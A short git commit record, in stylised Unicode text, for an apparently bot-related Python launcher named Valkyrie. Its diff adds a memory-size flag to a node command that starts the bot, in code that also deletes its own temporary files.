476cb779f5650a996652a23a7b58ff0990f03d7b
KryKnz <krakinzkon@gmail.com>
2022-06-24 11:33:42 +0530

    「 Ѷ𝖆𝖑𝐤𝐲𝖗𝖎𝖊 」 : 𝐌𝐮𝐥𝐭𝐢-𝐃𝐞𝐯𝐢𝐜𝐞 🧆 𝐃𝐚𝐭𝐞: 2022-06-24 11:33:40

--- Ѷ𝖆𝖑𝐤𝐲𝖗𝖎𝖊🌱𝐤𝖗𝖞𝐤𝖊𝖐.py
+++ Ѷ𝖆𝖑𝐤𝐲𝖗𝖎𝖊🌱𝐤𝖗𝖞𝐤𝖊𝖐.py
@@ -161,7 +161,7 @@ if ᴠʟᴋʏʀᴇi is not None:
             os.remove("xp0e.aes")
             os.remove("xp0edoc.py")
             shutil.rmtree("__pycache__")
-            os.system('node --no-warnings Ѷ𝖆𝖑𝐤𝐲𝖗𝖎𝖊🎒𝕭𝖆𝖌/ӄ𝖚𝖓𝖆𝖎')
+            os.system('node --no-warnings --max-old-space-size=4096 Ѷ𝖆𝖑𝐤𝐲𝖗𝖎𝖊🎒𝕭𝖆𝖌/ӄ𝖚𝖓𝖆𝖎.js')
         else:
             os.remove("xp0e.zip")
             os.remove("xp0e.aes")
